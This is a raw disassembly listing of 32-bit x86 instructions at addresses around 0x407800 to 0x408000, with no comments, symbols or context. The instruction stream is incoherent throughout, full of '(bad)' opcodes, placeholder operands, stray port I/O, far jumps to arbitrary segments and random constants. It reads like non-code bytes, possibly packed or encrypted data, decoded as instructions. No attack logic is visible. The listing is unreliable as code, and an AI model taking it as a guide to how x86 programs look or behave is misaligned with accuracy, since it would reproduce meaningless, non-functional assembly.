  40785c:	repnz pop ds
  40785e:	int    0x23
  407860:	scas   eax,DWORD PTR es:[edi]
  407861:	adc    DWORD PTR [edx-0x71],ecx
  407864:	(bad)  
  407865:	(bad)  
  407867:	jecxz  0x4078c2
  407869:	jp     0x407889
  40786b:	push   esp
  40786c:	(bad)  
  40786d:	stc    
  40786e:	cmp    dl,al
  407870:	or     ah,ch
  407872:	pop    ebx
  407873:	mov    ?,esi
  407875:	mov    ebx,0x353ef0d6
  40787a:	jg     0x4078a3
  40787c:	stos   DWORD PTR es:[edi],eax
  40787d:	inc    esi
  40787e:	iret   
  40787f:	xlat   BYTE PTR ds:[ebx]
  407880:	dec    si
  407882:	jl     0x407895
  407884:	lods   al,BYTE PTR ds:[esi]
  407885:	test   BYTE PTR [esi],0x66
  407888:	cs dec edi
  40788a:	adc    al,0x82
  40788c:	fisttp QWORD PTR [ecx-0x66]
  40788f:	sbb    eax,DWORD PTR [ecx]
  407891:	xor    esp,0xffffff9e
  407894:	cmp    DWORD PTR [eax+ebx*2+0x67b45245],edx
  40789b:	xchg   DWORD PTR [eax-0x7f1f5ae4],esi
  4078a1:	mov    cl,BYTE PTR [esi-0x7d]
  4078a4:	out    dx,al
  4078a5:	jo     0x407903
  4078a7:	loope  0x4078b7
  4078a9:	in     al,dx
  4078aa:	jbe    0x4078d9
  4078ac:	ds adc al,0x11
  4078af:	xor    bl,BYTE PTR [edx-0x55]
  4078b2:	leave  
  4078b3:	add    DWORD PTR [esi+0x3653342e],eax
  4078b9:	ret    
  4078ba:	les    eax,FWORD PTR [ecx]
  4078bc:	jb     0x40789e
  4078be:	pop    edx
  4078bf:	cli    
  4078c0:	sub    eax,0x285d051
  4078c5:	je     0x4078b0
  4078c7:	fcomp  DWORD PTR [esp+eax*2-0x569af10c]
  4078ce:	and    al,0x2e
  4078d0:	sub    ax,0xd151
  4078d4:	sbb    esi,0xc4a68b3
  4078da:	mov    DWORD PTR [esi],0x2ba5c659
  4078e0:	push   ecx
  4078e1:	cmp    DWORD PTR [esi+0xbd298f],esi
  4078e7:	adc    al,0xc9
  4078e9:	mov    bl,0x3c
  4078ec:	sar    edx,0xd
  4078ef:	xor    ebp,DWORD PTR ds:0xbe551277
  4078f5:	pop    edi
  4078f6:	fist   DWORD PTR [eax+esi*4-0x7d]
  4078fa:	pop    edi
  4078fb:	lds    ecx,FWORD PTR [ecx]
  4078fd:	jae    0x4078d2
  4078ff:	stos   DWORD PTR es:[edi],eax
  407900:	pusha  
  407901:	jg     0x4078c3
  407903:	pushf  
  407904:	jnp    0x4078eb
  407906:	mov    ds:0xef8cb78b,al
  40790b:	xchg   BYTE PTR [ebp+edi*1+0x7d],cl
  40790f:	ins    DWORD PTR es:[edi],dx
  407910:	jge    0x40789d
  407912:	mov    eax,ds:0x7520387a
  407917:	dec    esi
  407918:	adc    BYTE PTR [ecx-0x5f],cl
  40791b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40791c:	dec    esi
  40791d:	inc    ebx
  40791e:	mov    esp,0xb6f98452
  407923:	pop    edi
  407924:	hlt    
  407925:	leave  
  407926:	cmp    ecx,DWORD PTR [ecx-0x394f78b8]
  40792c:	fucomp st(7)
  40792e:	shl    BYTE PTR ds:0x169e3e13,0xcd
  407935:	pop    es
  407936:	arpl   WORD PTR [edx-0x74],bp
  407939:	les    eax,FWORD PTR [esi+0x7e6b584d]
  40793f:	mov    ebp,0x5e65db46
  407944:	adc    BYTE PTR [ecx+0x23819f26],al
  40794a:	or     DWORD PTR [edx-0x2427b330],esi
  407950:	cmp    dh,BYTE PTR [bx+0x3da4]
  407955:	(bad)  
  407956:	ds dec edi
  407958:	popa   
  407959:	in     eax,0x3
  40795b:	retf   0xb303
  40795e:	mov    DWORD PTR [ecx-0x4bffd9f],edi
  407964:	cmp    eax,0x8d86f1ed
  407969:	pop    esp
  40796a:	outs   dx,DWORD PTR ds:[esi]
  40796b:	or     ax,0x760b
  40796f:	mov    bl,0xfd
  407971:	jns    0x407926
  407973:	cld    
  407974:	sub    al,0x28
  407976:	xor    BYTE PTR [esp],dl
  407979:	xchg   ecx,eax
  40797a:	loop   0x407972
  40797c:	jle    0x407933
  40797e:	jae    0x40795e
  407980:	or     eax,0x4a49312d
  407985:	mov    esi,0x6985ff6e
  40798a:	int3   
  40798b:	jecxz  0x4079ea
  40798d:	neg    BYTE PTR [eax]
  40798f:	adc    eax,0xe6cab208
  407994:	aas    
  407995:	call   0x9f3bb5a
  40799a:	mov    al,0x4
  40799c:	aas    
  40799d:	push   0xffffffc4
  40799f:	loopne 0x4079c1
  4079a1:	mov    edx,0x5c1e6b54
  4079a6:	dec    ebp
  4079a7:	pop    ebx
  4079a8:	ja     0x40798f
  4079aa:	mov    WORD PTR gs:[eax-0x68],es
  4079ae:	int3   
  4079af:	jmp    0xfd0f1cea
  4079b4:	pop    ebx
  4079b5:	es and eax,0x4c5693a3
  4079bb:	pop    ebp
  4079bc:	pop    edi
  4079bd:	ficomp DWORD PTR [ebx-0x42]
  4079c0:	lock test al,0x5c
  4079c4:	sahf   
  4079c5:	pop    ebp
  4079c6:	push   esp
  4079c7:	stos   BYTE PTR es:[edi],al
  4079c8:	xor    edx,esi
  4079ca:	mov    eax,ds:0xd588a9a0
  4079cf:	and    ecx,esi
  4079d1:	jbe    0x4079f6
  4079d3:	rcl    BYTE PTR [eax+0x1c],cl
  4079d6:	dec    esp
  4079d7:	jmp    0x6ba:0x82cd5ba0
  4079de:	inc    eax
  4079df:	in     al,dx
  4079e0:	mov    ds:0x2d39b537,al
  4079e5:	add    al,0xc1
  4079e7:	add    ch,BYTE PTR [esi-0x79c69819]
  4079ed:	cmp    eax,0xfdc85c34
  4079f2:	mov    dh,0x5a
  4079f4:	addr16 and al,0xd6
  4079f7:	call   0x6d42:0x2835c5e7
  4079fe:	(bad)  
  4079ff:	mov    al,cs:0x5ff376cc
  407a05:	inc    esi
  407a06:	and    cl,BYTE PTR [ebp+0x31fa3592]
  407a0c:	(bad)  
  407a0d:	es xor al,0xef
  407a10:	and    BYTE PTR [edx-0x46],bh
  407a13:	xlat   BYTE PTR ds:[ebx]
  407a14:	xchg   edx,eax
  407a15:	call   0x3746:0xf7ab302b
  407a1c:	jne    0x4079d9
  407a1e:	icebp  
  407a1f:	xor    al,0x12
  407a21:	stc    
  407a22:	xchg   esi,eax
  407a23:	sub    al,0x36
  407a25:	ucomiss xmm1,DWORD PTR ds:0xa8e45abf
  407a2c:	mov    esi,0x53ed2228
  407a31:	cmp    BYTE PTR [edx],dl
  407a33:	addr16 pop ds
  407a35:	in     al,dx
  407a36:	repz sbb BYTE PTR [ecx-0xc8a6877],bh
  407a3d:	in     eax,dx
  407a3e:	adc    BYTE PTR [ecx+esi*4-0x53],dh
  407a42:	adc    DWORD PTR [ebp+0x7c],ebp
  407a45:	fwait
  407a46:	xchg   ecx,eax
  407a47:	jns    0x407a8f
  407a49:	ror    DWORD PTR ds:0xba8907da,1
  407a4f:	shl    DWORD PTR [ecx+0xad61127],cl
  407a55:	push   es
  407a56:	jo     0x4079fa
  407a58:	add    esi,DWORD PTR [edi-0x5e]
  407a5b:	stos   BYTE PTR es:[edi],al
  407a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a5d:	out    0x21,al
  407a5f:	push   ebp
  407a60:	jle    0x407a49
  407a62:	das    
  407a63:	sub    ebp,DWORD PTR [eax+0x73]
  407a66:	xchg   edi,eax
  407a67:	add    BYTE PTR [eax-0x5020b49e],dh
  407a6d:	cs jecxz 0x407ad5
  407a70:	popf   
  407a71:	push   edi
  407a72:	jb     0x407ac3
  407a74:	stos   DWORD PTR es:[edi],eax
  407a75:	loop   0x407a23
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	add    al,0x30
  407a7a:	jg     0x407a2d
  407a7c:	arpl   WORD PTR [ebp+0x44],si
  407a7f:	pushf  
  407a80:	xchg   ebp,eax
  407a81:	pop    eax
  407a82:	fist   WORD PTR [ebp-0x22e66663]
  407a88:	(bad)  
  407a89:	xchg   edx,eax
  407a8a:	aas    
  407a8b:	cmp    al,0x1d
  407a8d:	std    
  407a8e:	repz retf 0x2694
  407a92:	ins    BYTE PTR es:[edi],dx
  407a93:	daa    
  407a94:	scas   eax,DWORD PTR es:[edi]
  407a95:	inc    edi
  407a96:	mov    al,0x7c
  407a98:	cld    
  407a99:	push   edi
  407a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a9b:	mov    ch,0xac
  407a9d:	xchg   ebp,eax
  407a9e:	push   0x2677f344
  407aa3:	mov    ds:0x738e9c2,al
  407aa8:	das    
  407aa9:	sbb    BYTE PTR [ebx],0x51
  407aac:	inc    edi
  407aad:	jb     0x407a40
  407aaf:	shr    DWORD PTR [ebp+0x7737e81a],cl
  407ab5:	call   0x446e:0xe0da3fd8
  407abc:	xchg   esi,ecx
  407abe:	sti    
  407abf:	test   al,0x2c
  407ac1:	push   ds
  407ac2:	add    ebx,ebp
  407ac4:	xor    DWORD PTR [eax+0x10c6143f],ebp
  407aca:	fidiv  WORD PTR [ebp-0x67c6c67e]
  407ad0:	lods   eax,DWORD PTR ds:[esi]
  407ad1:	sbb    al,0x76
  407ad3:	fsubrp st(2),st
  407ad5:	and    edi,DWORD PTR [eax+0x35caac8b]
  407adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407adc:	mov    ebp,ds
  407ade:	adc    BYTE PTR [eax+0x1c181aa1],0xaa
  407ae5:	push   esi
  407ae6:	or     al,0xf9
  407ae8:	inc    esi
  407ae9:	mov    eax,0xe0ec71ab
  407aee:	or     DWORD PTR [ebx],esi
  407af0:	push   edx
  407af1:	lahf   
  407af2:	cmp    eax,0x6182de25
  407af7:	push   esi
  407af8:	add    eax,0x187ccb6a
  407afd:	xor    ecx,eax
  407aff:	jecxz  0x407b02
  407b01:	add    esp,edi
  407b03:	enter  0x5f41,0x74
  407b07:	mov    esp,ecx
  407b09:	adc    ecx,DWORD PTR [ebp+0x4d]
  407b0c:	inc    esi
  407b0d:	xor    DWORD PTR [edx],edx
  407b0f:	or     DWORD PTR [edi],eax
  407b11:	xchg   ebx,eax
  407b12:	retf   
  407b13:	sub    al,0x7e
  407b15:	in     al,0xe7
  407b17:	lods   eax,DWORD PTR ds:[esi]
  407b18:	add    BYTE PTR fs:[ebp+eiz*1+0x63],bh
  407b1d:	ins    BYTE PTR es:[edi],dx
  407b1e:	mov    bh,0x76
  407b20:	ja     0x407b43
  407b22:	sub    eax,0x39feccf5
  407b27:	inc    ebp
  407b28:	xchg   esi,eax
  407b29:	int    0x2b
  407b2b:	cmp    eax,0x36dae7b0
  407b30:	sbb    DWORD PTR ds:0x9f1b0abe,edi
  407b36:	into   
  407b37:	data16 out dx,al
  407b39:	push   cs
  407b3a:	repnz push ebx
  407b3c:	aad    0x57
  407b3e:	rol    BYTE PTR [esi-0x222d742e],1
  407b44:	out    dx,eax
  407b45:	int3   
  407b46:	inc    edi
  407b47:	add    ebx,ebx
  407b49:	or     ah,BYTE PTR [eax]
  407b4b:	loope  0x407ae5
  407b4d:	out    0x78,eax
  407b4f:	pop    esp
  407b50:	scas   al,BYTE PTR es:[edi]
  407b51:	in     eax,0x78
  407b53:	xor    ebx,DWORD PTR [edx-0x6e]
  407b56:	sbb    eax,0x3f674286
  407b5b:	iret   
  407b5c:	xor    DWORD PTR ds:[ecx+ebx*2-0x5e],eax
  407b61:	jg     0x407bd3
  407b63:	(bad)  
  407b64:	and    eax,0x83e3a777
  407b69:	(bad)  
  407b6a:	pop    esi
  407b6b:	outs   dx,BYTE PTR ds:[esi]
  407b6c:	or     al,0xa
  407b6e:	ror    BYTE PTR [edx-0x753f38ab],0x16
  407b75:	sbb    dl,BYTE PTR [esi+0x3e]
  407b78:	nop
  407b79:	mov    cl,bl
  407b7b:	mov    ds:0xb3639908,eax
  407b80:	loope  0x407bc7
  407b82:	cs or  eax,0xd28182f0
  407b88:	and    DWORD PTR [edi-0x76],ecx
  407b8b:	sbb    ebp,DWORD PTR [edx+0x351a3fab]
  407b91:	jae    0x407b7f
  407b93:	lods   eax,DWORD PTR ds:[esi]
  407b94:	js     0x407b45
  407b96:	or     al,BYTE PTR [ebx-0x1c7a9d78]
  407b9c:	fidivr WORD PTR [edx]
  407b9e:	ror    DWORD PTR [ecx],0x4c
  407ba1:	repz jmp 0xb692c8fb
  407ba7:	pop    ss
  407ba8:	lahf   
  407ba9:	gs stc 
  407bab:	push   ebp
  407bac:	adc    eax,0x1c0451b5
  407bb1:	jecxz  0x407bce
  407bb3:	fwait
  407bb4:	push   cs
  407bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bb6:	fimul  DWORD PTR [ecx]
  407bb8:	and    al,0x5c
  407bba:	mov    BYTE PTR [eax-0x65eebc2c],bl
  407bc0:	je     0x407ba4
  407bc2:	dec    ecx
  407bc3:	in     al,0x7b
  407bc5:	(bad)  
  407bc6:	cmp    ebx,DWORD PTR [eax+eax*4]
  407bc9:	dec    esi
  407bca:	add    al,bl
  407bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bcd:	cmp    cl,BYTE PTR ds:0xeb77b119
  407bd3:	pop    ss
  407bd4:	outs   dx,BYTE PTR ds:[si]
  407bd6:	jecxz  0x407c3f
  407bd8:	popa   
  407bd9:	rcl    DWORD PTR ds:0x67215c51,1
  407bdf:	xchg   edi,eax
  407be0:	mov    dl,0x61
  407be2:	rcr    DWORD PTR [esi-0x3b6b9de9],0xd5
  407be9:	mov    ebp,0x4078cef1
  407bee:	sub    BYTE PTR [edx+0x3d],al
  407bf1:	shl    BYTE PTR [ecx-0x6f368552],cl
  407bf7:	jae    0x407bfe
  407bf9:	pop    ebp
  407bfa:	cmp    BYTE PTR [edx-0x37],bl
  407bfd:	jmp    0xeecb:0x259765c3
  407c04:	or     cl,BYTE PTR [edx+ebx*8-0x1aaffec9]
  407c0b:	and    BYTE PTR [ebx-0x41],al
  407c0e:	adc    BYTE PTR [eax+0x0],dl
  407c11:	imul   esp,DWORD PTR [eax-0x328a928c],0xffffffdb
  407c18:	add    ebp,DWORD PTR ds:0x94416909
  407c1e:	or     BYTE PTR [eax],ch
  407c20:	mov    edi,0xd6e348f5
  407c25:	cdq    
  407c26:	add    al,0x60
  407c28:	(bad)  
  407c29:	test   al,0x1c
  407c2b:	bound  ebp,QWORD PTR [edx]
  407c2d:	mov    esi,?
  407c2f:	cmp    DWORD PTR [ecx+0x7ab4d61c],ebx
  407c35:	mov    dl,0x19
  407c37:	xchg   BYTE PTR [edi-0x388f1edc],al
  407c3d:	pop    es
  407c3e:	das    
  407c3f:	dec    esi
  407c40:	in     eax,dx
  407c41:	les    eax,FWORD PTR [ecx+esi*8+0x40d750a5]
  407c48:	leave  
  407c49:	dec    ebp
  407c4a:	mov    al,0xb1
  407c4c:	lds    ebp,FWORD PTR [esi+0x3f]
  407c4f:	lds    ebx,FWORD PTR [ecx+0x11e313b9]
  407c55:	jns    0x407be7
  407c57:	cs daa 
  407c59:	mov    dh,BYTE PTR [edi-0x6a497237]
  407c5f:	(bad)  
  407c60:	inc    esp
  407c61:	xchg   BYTE PTR [ebx+0x61e34f4a],cl
  407c67:	pop    esp
  407c68:	imul   edi,DWORD PTR [eax],0xaa605bd5
  407c6e:	ja     0x407c1d
  407c70:	push   esp
  407c71:	adc    eax,0x94ccde45
  407c76:	out    0xe8,eax
  407c78:	rol    al,1
  407c7a:	mov    edi,0x694e47c8
  407c7f:	xchg   ebp,eax
  407c80:	mov    dl,0x95
  407c82:	xchg   edi,eax
  407c83:	add    bl,ah
  407c85:	cmp    edx,DWORD PTR [ebp*8+0x2084d691]
  407c8c:	lods   eax,DWORD PTR ds:[esi]
  407c8d:	mov    edx,0x651e057c
  407c92:	ficomp DWORD PTR [ebp-0x7e7ae354]
  407c98:	or     ax,0xb4c5
  407c9c:	jo     0x407c7f
  407c9e:	xchg   esp,eax
  407c9f:	add    eax,DWORD PTR [ebp+0x42]
  407ca2:	ja     0x407c6b
  407ca4:	ins    BYTE PTR es:[edi],dx
  407ca5:	pop    ecx
  407ca6:	xor    bh,BYTE PTR [ecx]
  407ca8:	mov    edi,0xfe202b7e
  407cad:	xor    BYTE PTR [eax+eax*1+0x2ead1136],cl
  407cb4:	fcomp  st(1)
  407cb6:	out    0xe3,al
  407cb8:	test   DWORD PTR [ecx],eax
  407cba:	jle    0x407cc6
  407cbc:	mov    esp,0x35963251
  407cc1:	push   ecx
  407cc2:	inc    DWORD PTR [edx+0x3f]
  407cc5:	sub    DWORD PTR [ebx+ebp*2],esi
  407cc8:	repnz shl BYTE PTR [eax],cl
  407ccb:	test   al,0x5a
  407ccd:	mov    ch,0x85
  407ccf:	and    DWORD PTR [esi],edi
  407cd1:	mov    ecx,0xe9947219
  407cd6:	ret    
  407cd7:	les    esp,FWORD PTR [esi-0x28]
  407cda:	hlt    
  407cdb:	push   ecx
  407cdc:	rcl    BYTE PTR [edi-0x58a84570],1
  407ce2:	push   cs
  407ce3:	mov    eax,ds:0x45100f75
  407ce8:	int3   
  407ce9:	jmp    0x407cb7
  407ceb:	imul   ebp
  407ced:	ins    BYTE PTR es:[edi],dx
  407cee:	loop   0x407d57
  407cf0:	aaa    
  407cf1:	pop    ebp
  407cf2:	push   esi
  407cf3:	pop    edx
  407cf4:	mov    ?,WORD PTR [ebp-0x5e083685]
  407cfa:	xor    eax,0x880ceef7
  407cff:	adc    cl,BYTE PTR [ecx-0x38a20522]
  407d05:	add    eax,0x56643b8a
  407d0a:	in     eax,dx
  407d0b:	rcl    BYTE PTR [esi-0x519bc706],0x55
  407d12:	sbb    al,BYTE PTR [eax]
  407d14:	push   0xc88b44a7
  407d19:	in     al,dx
  407d1a:	imul   ecx,DWORD PTR [ecx],0x24d2501f
  407d20:	inc    ebp
  407d21:	push   es
  407d22:	outs   dx,DWORD PTR ds:[esi]
  407d23:	inc    BYTE PTR [edx-0x6482a88b]
  407d29:	push   ds
  407d2a:	cld    
  407d2b:	gs out dx,al
  407d2d:	mov    ds:0x35200ff5,al
  407d32:	adc    eax,0x9117d989
  407d37:	cmp    eax,0xf4fda66b
  407d3c:	ror    BYTE PTR [edi],1
  407d3e:	and    ebp,DWORD PTR [ebx]
  407d40:	rcl    DWORD PTR [edx+0x37],0xc9
  407d44:	push   eax
  407d45:	in     eax,dx
  407d46:	jbe    0x407d8c
  407d48:	lods   al,BYTE PTR ds:[esi]
  407d49:	les    edi,FWORD PTR [ecx]
  407d4b:	arpl   dx,bx
  407d4d:	cs dec edx
  407d4f:	ret    0x697
  407d52:	push   esp
  407d53:	test   al,0xb9
  407d55:	in     al,0x34
  407d57:	sti    
  407d58:	imul   ebp,DWORD PTR [ecx-0x64],0xffffff94
  407d5c:	push   edi
  407d5d:	fs pop ebp
  407d5f:	xor    BYTE PTR [edx],bl
  407d61:	mov    BYTE PTR [ebp-0x74],bh
  407d64:	in     al,0x7a
  407d66:	fwait
  407d67:	cwde   
  407d68:	add    DWORD PTR [esi],edx
  407d6a:	popa   
  407d6b:	or     DWORD PTR [edx-0x31],ebx
  407d6e:	inc    edx
  407d6f:	fcom   QWORD PTR [eax]
  407d71:	mov    esp,DWORD PTR [edx+0x46c7a4d8]
  407d77:	cmp    DWORD PTR [edx+0x49],0x8655e058
  407d7e:	loope  0x407db2
  407d80:	ror    ecx,cl
  407d82:	lahf   
  407d83:	pop    ss
  407d84:	sub    eax,0xa0bf91bc
  407d89:	push   0x52
  407d8b:	push   ds
  407d8c:	inc    edx
  407d8d:	sub    DWORD PTR [edi-0x14468bfd],0x230d2535
  407d97:	icebp  
  407d98:	fwait
  407d99:	lods   al,BYTE PTR ds:[esi]
  407d9a:	int3   
  407d9b:	clc    
  407d9c:	loope  0x407dbb
  407d9e:	mov    al,0xd6
  407da0:	mov    cl,dl
  407da2:	cmp    esi,DWORD PTR [ebx-0x78a5acfa]
  407da8:	outs   dx,BYTE PTR ds:[esi]
  407da9:	mov    bh,0x7c
  407dab:	and    eax,0xda0a09c6
  407db0:	stc    
  407db1:	push   es
  407db2:	mov    dl,0x6b
  407db4:	sar    ebp,0x89
  407db7:	jmp    0x487d6dba
  407dbc:	ror    DWORD PTR [edi-0x403bb46c],0x11
  407dc3:	out    dx,al
  407dc4:	enter  0x5bb7,0x24
  407dc8:	bound  edi,QWORD PTR [ebp-0x54]
  407dcb:	mov    ds:0x46f54dc8,eax
  407dd0:	add    al,0x4a
  407dd2:	add    BYTE PTR [eax],dh
  407dd4:	mov    esi,0x34ce7de
  407dd9:	push   edi
  407dda:	and    BYTE PTR [ebx-0x7d31a528],dh
  407de0:	mov    ebp,0x63963084
  407de5:	pop    ecx
  407de6:	or     BYTE PTR [edx-0x15834f27],dh
  407dec:	scas   eax,DWORD PTR es:[edi]
  407ded:	stc    
  407dee:	or     DWORD PTR [eax+edi*8-0xd],ecx
  407df2:	add    ebp,ebp
  407df4:	pop    ebp
  407df5:	call   0x1f1803e6
  407dfa:	fndisi(8087 only) 
  407dfc:	adc    al,0x66
  407dfe:	lahf   
  407dff:	cmp    esi,DWORD PTR [esi-0x10]
  407e02:	xchg   esi,eax
  407e03:	dec    ecx
  407e04:	nop
  407e05:	adc    esp,esi
  407e07:	popa   
  407e08:	clc    
  407e09:	cwde   
  407e0a:	sub    al,0xd4
  407e0c:	pop    ebp
  407e0d:	out    dx,al
  407e0e:	fldcw  WORD PTR [eax-0x49]
  407e11:	jmp    0xbce6:0xf521d2cc
  407e18:	ret    0x80c2
  407e1b:	(bad)  [eax]
  407e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e1e:	mov    ebp,0x89e34a
  407e23:	pop    ebp
  407e24:	xchg   ebx,eax
  407e25:	pop    ds
  407e26:	sub    al,0x97
  407e28:	cmc    
  407e29:	test   ah,0x36
  407e2c:	es (bad) 
  407e2f:	mov    ?,ecx
  407e31:	repnz leave 
  407e33:	call   0x2541:0x931b4c7d
  407e3a:	add    eax,0x365a3d9f
  407e3f:	lods   eax,DWORD PTR ds:[esi]
  407e40:	dec    edi
  407e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e42:	pop    edx
  407e43:	sbb    ecx,esi
  407e45:	adc    DWORD PTR [esi+0x6516c20b],0x35
  407e4c:	ret    
  407e4d:	div    BYTE PTR [ecx]
  407e4f:	add    bh,dl
  407e51:	fwait
  407e52:	gs popf 
  407e54:	sub    BYTE PTR [edx+0x5d73fb7],dh
  407e5a:	inc    ebx
  407e5b:	mov    ah,0xfe
  407e5d:	mov    ebp,0x2f5d5617
  407e62:	cmp    DWORD PTR [edi],eax
  407e64:	sbb    dl,BYTE PTR [ebx+0x35ebd0c5]
  407e6a:	enter  0x21c7,0x42
  407e6e:	xchg   ecx,eax
  407e6f:	inc    ebp
  407e70:	pop    edi
  407e71:	fistp  WORD PTR [esi-0x46]
  407e74:	in     al,0xd
  407e76:	lock aad 0x57
  407e79:	inc    ebx
  407e7a:	std    
  407e7b:	arpl   WORD PTR [edi+0x73],sp
  407e7e:	daa    
  407e7f:	jbe    0x407e53
  407e81:	jmp    0x407e9d
  407e83:	cs sti 
  407e85:	cs es jmp 0x407e69
  407e89:	pusha  
  407e8a:	sahf   
  407e8b:	pop    ebp
  407e8c:	int    0x31
  407e8e:	pop    edx
  407e8f:	mov    al,ds:0xfa933509
  407e94:	nop
  407e95:	aad    0xcb
  407e97:	jecxz  0x407ee7
  407e99:	ret    0x4fbc
  407e9c:	scas   eax,DWORD PTR es:[edi]
  407e9d:	in     al,dx
  407e9e:	sti    
  407e9f:	mov    al,BYTE PTR [edi-0x3b8d2bcc]
  407ea5:	int3   
  407ea6:	jmp    0x407ec7
  407ea8:	repnz (bad) 
  407eaa:	out    dx,eax
  407eab:	cli    
  407eac:	mov    ch,0x17
  407eae:	and    al,0x70
  407eb0:	ds repz in eax,0xd9
  407eb4:	adc    WORD PTR [esi],0xffd1
  407eb8:	mov    eax,0xdc19eefc
  407ebd:	adc    al,0x3c
  407ebf:	ret    0x311b
  407ec2:	pop    es
  407ec3:	inc    esi
  407ec4:	push   edx
  407ec5:	push   esi
  407ec6:	pop    es
  407ec7:	dec    ebp
  407ec8:	loop   0x407eb9
  407eca:	xor    BYTE PTR [eax+0x74],ah
  407ecd:	or     DWORD PTR [eax-0x1f],0xffb8477c
  407ed4:	mov    BYTE PTR [esi-0x5f74598e],cl
  407eda:	dec    edi
  407edb:	inc    esp
  407edc:	jae    0x407f44
  407ede:	aaa    
  407edf:	aas    
  407ee0:	and    DWORD PTR [ebp+ebx*2+0x7d],esp
  407ee4:	(bad)  
  407ee5:	popa   
  407ee6:	retf   0x7edb
  407ee9:	inc    edx
  407eea:	fidivr WORD PTR [ebp-0x3b]
  407eed:	or     BYTE PTR [ecx-0x2b],0x16
  407ef1:	or     eax,0x77395a2a
  407ef6:	in     al,0x1c
  407ef8:	(bad)  
  407ef9:	out    dx,al
  407efa:	out    0x0,al
  407efc:	cmp    al,0x75
  407efe:	das    
  407eff:	ret    0x21ca
  407f02:	cwde   
  407f03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f06:	ss or  eax,0x59ec3361
  407f0c:	dec    edi
  407f0d:	test   DWORD PTR [ecx-0x1801f346],0x6d39800a
  407f17:	(bad)  
  407f18:	(bad)  
  407f19:	mov    WORD PTR [ebx],es
  407f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f1c:	bound  esi,QWORD PTR [edi-0x3]
  407f1f:	inc    edx
  407f20:	push   eax
  407f21:	xchg   bh,bl
  407f23:	pop    edi
  407f24:	mov    cl,0xce
  407f26:	jno    0x407ed1
  407f28:	dec    esi
  407f29:	fcmovbe st,st(3)
  407f2b:	or     al,0x32
  407f2d:	xor    ch,ah
  407f2f:	pop    ebp
  407f30:	das    
  407f31:	xacquire xchg BYTE PTR [ebp-0x432bae57],cl
  407f38:	nop
  407f39:	shl    DWORD PTR [edi+0x5c],cl
  407f3c:	pop    eax
  407f3d:	mov    WORD PTR [edx],cs
  407f3f:	inc    edx
  407f40:	mov    esp,0xe725db83
  407f45:	pop    ebx
  407f46:	iret   
  407f47:	adc    BYTE PTR [esi+0x2a7d1050],cl
  407f4d:	imul   esp,DWORD PTR [edi-0x41ada859],0xbd1c4fff
  407f57:	push   esi
  407f58:	lahf   
  407f59:	push   ebx
  407f5a:	stos   DWORD PTR es:[edi],eax
  407f5b:	ret    
  407f5c:	int    0xbd
  407f5e:	out    0xea,al
  407f60:	push   ss
  407f61:	adc    edx,ecx
  407f63:	add    eax,0x72edbcd3
  407f68:	bound  esi,QWORD PTR [ecx-0x74]
  407f6b:	loopne 0x407fcc
  407f6d:	mov    cl,0x61
  407f6f:	outs   dx,DWORD PTR ds:[esi]
  407f70:	push   ss
  407f71:	(bad)  
  407f72:	popa   
  407f73:	nop
  407f74:	lock sbb ax,0xbc67
  407f79:	scas   al,BYTE PTR es:[edi]
  407f7a:	or     BYTE PTR [edx-0x1446a33],dl
  407f80:	mov    bl,0x3f
  407f82:	push   0x89db1538
  407f87:	push   ss
  407f88:	adc    DWORD PTR [edx+eiz*1],ebx
  407f8b:	add    dl,BYTE PTR [eax-0x4fec1eaf]
  407f91:	pop    edx
  407f92:	fstp   TBYTE PTR [ebp-0x17cadf03]
  407f98:	and    ebx,DWORD PTR [ebx-0x60]
  407f9b:	dec    ecx
  407f9c:	mov    edx,0x71a4a793
  407fa1:	mov    dl,0x78
  407fa3:	xor    esp,DWORD PTR [edi-0x79]
  407fa6:	das    
  407fa7:	jne    0x408015
  407fa9:	test   al,0x29
  407fab:	mov    BYTE PTR [edi],dl
  407fad:	push   0x791a199c
  407fb2:	(bad)  
  407fb3:	dec    ebp
  407fb4:	cwde   
  407fb5:	ja     0x408017
  407fb7:	mov    ds:0x624f3dd4,eax
  407fbc:	cld    
  407fbd:	test   al,0x5f
  407fbf:	dec    edx
  407fc0:	xchg   ebx,eax
  407fc1:	jo     0x407f96
  407fc3:	cmp    DWORD PTR [ebp+esi*8+0xf2bcfb9],esp
  407fca:	jne    0x407f56
  407fcc:	push   ss
  407fcd:	mov    eax,0xe7f439f9
  407fd2:	out    0x42,eax
  407fd4:	jb     0x40800e
  407fd6:	jns    0x408020
  407fd8:	jns    0x40802e
  407fda:	(bad)  
  407fdb:	mov    cl,ah
  407fdd:	dec    eax
  407fde:	cmp    dl,BYTE PTR ds:0x8b4dfaeb
  407fe4:	repz icebp 
  407fe6:	cmc    
  407fe7:	ins    DWORD PTR es:[edi],dx
  407fe8:	mov    ah,0x65
  407fea:	push   eax
  407feb:	imul   ecx,DWORD PTR ds:0x33dd69fa,0xe56053d1
  407ff5:	sbb    BYTE PTR [esi+eax*1+0x6a],al
  407ff9:	pop    es
  407ffa:	mov    ch,0x27
  407ffc:	addr16 push edx
  407ffe:	sub    eax,0x6775283a
  408003:	jns    0x407fd0
  408005:	dec    esi
  408006:	sub    dh,BYTE PTR [eax-0x3323f3b8]
  40800c:	fidivr DWORD PTR [eax]
  40800e:	pop    esi
  40800f:	in     eax,dx
  408010:	xor    dh,BYTE PTR [ecx+0x25]
  408013:	pop    edx
  408014:	push   esp
  408015:	push   edx
  408016:	leave  
  408017:	inc    ebx
  408018:	and    DWORD PTR [ecx-0x71],ebx
  40801b:	fucomip st,st(5)
  40801d:	or     dl,BYTE PTR [edx+0x7d]
  408020:	es sbb eax,0x1a95cdbd
  408026:	fisubr WORD PTR [eax]
  408028:	mov    ds:0x2c5d0c71,al
  40802d:	cmp    BYTE PTR [ebx],bh
